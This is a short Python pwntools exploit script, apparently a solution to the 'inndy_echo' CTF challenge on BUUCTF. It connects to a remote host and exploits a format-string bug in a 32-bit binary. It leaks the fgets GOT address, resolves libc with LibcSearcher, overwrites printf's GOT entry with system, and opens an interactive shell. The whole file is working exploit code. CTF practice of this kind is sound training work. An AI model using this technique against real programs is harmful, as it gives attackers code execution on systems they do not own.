from platform import system_alias
from pwn import *
context.log_level = 'debug'
context.arch = 'i386'
context.terminal = ['tmux', 'splitw', '-h']

host = 'node4.buuoj.cn'
port = 27350
elfpath = './echo'
libcpath = ''

if args.LOCAL:
    p = process([elfpath])
    # gdb.attach(p)
else:
    p = remote(host, port)
    
s = lambda content: p.send(content)
sl = lambda content: p.sendline(content)
r = lambda n: p.recv(n)
ru = lambda pattern: p.recvuntil(pattern)
rl = lambda: p.recvline()
ru7f = lambda: p.recvuntil(b'\x7f')
su = lambda x: p.success(x)
shell = lambda: p.interactive()

# start pwning
'''
❯ checksec ./echo
[*] '/home/leo/ctfs/ctfoj/BUUCTF/Pwn/inndy_echo/echo'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
'''
# test = b'a' * 4 + b'%p.' * 8
# print(test)
# sl(test)

# leak and overwirte
e = ELF(elfpath)
payload1 = p32(e.got['fgets']) + b'%7$s'
sl(payload1)

from LibcSearcher import *

r(4)
fgets_addr = u32(r(4))

libc = LibcSearcher('fgets', fgets_addr)
libc_base = fgets_addr - libc.dump('fgets')
system = libc_base + libc.dump('system')

payload2 = fmtstr_payload(offset=7, writes = {e.got['printf']: system})
sl(payload2)

shell()


